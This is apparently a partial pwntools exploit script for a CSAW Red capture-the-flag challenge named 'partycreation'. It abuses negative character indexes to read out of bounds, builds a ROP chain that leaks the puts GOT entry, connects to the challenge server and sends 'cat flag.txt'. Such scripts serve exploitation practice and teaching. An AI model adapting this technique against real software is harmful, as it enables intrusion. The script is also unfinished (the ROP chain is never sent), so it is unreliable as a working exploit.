#!/usr/bin/env python3

from pwn import *

def menuChoice(n):
    print(conn.recvuntil('(4) Begin Hacking\n> ').decode())
    conn.sendline(str(n).encode())

def createCharacter(name):
    assert len(name) <= 15
    menuChoice(1)
    print(conn.recvuntil(b'Enter your character\'s name:\n>').decode())
    conn.sendline(name)
    print(conn.recvuntil(b'joined your party!\n').decode())

def viewCharacter(index):
    menuChoice(2)
    print(conn.recvuntil(b'Which character do you wish to view (0-5)? \n>').decode())
    conn.sendline(str(index).encode())
    sep = b'-----------------------------\n'
    print((conn.recvuntil(sep)+conn.recvuntil(sep)+conn.recvuntil(sep)).decode())

def renameCharacter(index, name):
    assert len(name) <= 15
    menuChoice(3)
    print(conn.recvuntil(b'wish to rename (0-5)? \n>').decode())
    conn.sendline(str(index).encode())
    print(conn.recvuntil(b'name:\n>').decode())
    conn.sendline(name)
    print(conn.recvuntil(b'Rename complete.\n').decode())

###
context.arch = 'amd64'
elf = ELF("./partycreation")
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['runMenu'])
ropchain = rop.chain()
print(len(ropchain), ropchain)
###

if args.REMOTE:
    conn = remote('pwn.red.csaw.io', 5010)
else:
    conn = gdb.debug('./partycreation', gdbscript=(''
            +'break runMenu\n'
            +'c\n'
           )
           )

createCharacter(b'freddy')
viewCharacter(0)
renameCharacter(0,b'mercury')
viewCharacter(0)
viewCharacter(-1)
viewCharacter(-2)
viewCharacter(-3)
viewCharacter(-9)

conn.interactive()

print('ls')
conn.sendline(b'ls')

print(conn.recv().decode('ascii'))

conn.sendline(b'cat flag.txt')

print(conn.recv().decode('ascii'))

conn.close()
